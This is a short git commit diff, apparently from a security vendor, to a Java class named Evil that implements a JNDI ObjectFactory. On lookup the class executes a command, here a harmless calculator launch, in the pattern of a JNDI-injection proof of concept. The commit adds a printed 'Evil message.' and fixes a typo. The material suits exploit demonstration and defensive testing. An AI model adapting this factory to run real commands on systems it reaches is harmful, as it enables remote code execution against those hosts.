4197044de815a603d49e783eae5db36485ffcc0c
Pawel Smigiel <psmigiel@waratek.com>
2021-12-10 19:25:22 +0000

    added evil message

--- src/java/jndiserver/Evil.java
+++ src/java/jndiserver/Evil.java
@@ -6,10 +6,15 @@ import javax.naming.spi.ObjectFactory;
 import java.util.Hashtable;
 
 public class Evil implements ObjectFactory {
+
+    {
+        System.err.println("Evil message.");
+    }
+
     @Override
     public Object getObjectInstance (Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment)  throws Exception {
-        String commond = "gnome-calculator" ;
-        Runtime.getRuntime().exec(commond);
+        String command = "gnome-calculator" ;
+        Runtime.getRuntime().exec(command);
         return  null ;
     }
 }
